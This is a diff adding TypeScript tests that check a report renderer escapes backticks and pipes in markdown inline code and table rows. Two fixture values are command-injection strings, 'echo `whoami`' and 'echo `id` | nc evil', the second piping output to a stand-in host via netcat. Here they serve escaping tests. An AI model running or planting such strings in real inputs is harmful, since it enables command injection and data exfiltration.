@@ -162,6 +162,60 @@ describe("issue #9: report renderer", () => {
     });
   });
 
+  describe("inline-code escaping (reviewer N1)", () => {
+    test("a reveal value containing a backtick is escaped in the plaintext section", () => {
+      const inv: InventoryEntry[] = [
+        entry({
+          path: "inputs.cmd",
+          disposition: "reveal",
+          occurrences: 2,
+          distinctValues: 1,
+          example: "echo `whoami`",
+        }),
+      ];
+      const report = renderReport(manifest(), inv);
+
+      // The backtick is escaped (backslash precedes it) so the inline-code span stays intact.
+      expect(report).toMatch(/example: `echo \\`whoami\\``/);
+      // The code span is balanced — an even number of unescaped backticks on the line.
+      const line = report.split("\n").find((l) => l.includes("inputs.cmd"))!;
+      const unescaped = line.replace(/\\`/g, "").match(/`/g)?.length ?? 0;
+      expect(unescaped % 2).toBe(0);
+    });
+
+    test("a value with a backtick and pipe renders a balanced table row", () => {
+      const inv: InventoryEntry[] = [
+        entry({
+          path: "inputs.cmd",
+          disposition: "reveal",
+          occurrences: 2,
+          distinctValues: 1,
+          example: "echo `id` | nc evil",
+        }),
+      ];
+      const report = renderReport(manifest(), inv);
+
+      const row = report.split("\n").find((l) => l.startsWith("| `inputs.cmd`"))!;
+      expect(row).toBeDefined();
+      // Pipe is escaped (`\|`) so a markdown renderer keeps it in one column.
+      expect(row).toContain("\\|");
+      // Backtick is escaped so the code span is balanced.
+      const unescaped = row.replace(/\\`/g, "").match(/`/g)?.length ?? 0;
+      expect(unescaped % 2).toBe(0);
+    });
+  });
+
+  describe("drop disposition renders an em-dash example (reviewer)", () => {
+    test("a dropped path shows no example value in the table", () => {
+      const inv: InventoryEntry[] = [
+        entry({ path: "inputs.secret", disposition: "drop", occurrences: 9, distinctValues: 0, example: null }),
+      ];
+      const report = renderReport(manifest(), inv);
+
+      expect(report).toContain("| `inputs.secret` | 9 | drop | 0 | — |");
+    });
+  });
+
   describe("capped inventory", () => {
     test("a capped path warns and the cap is noted in the table", () => {
       const inv: InventoryEntry[] = [
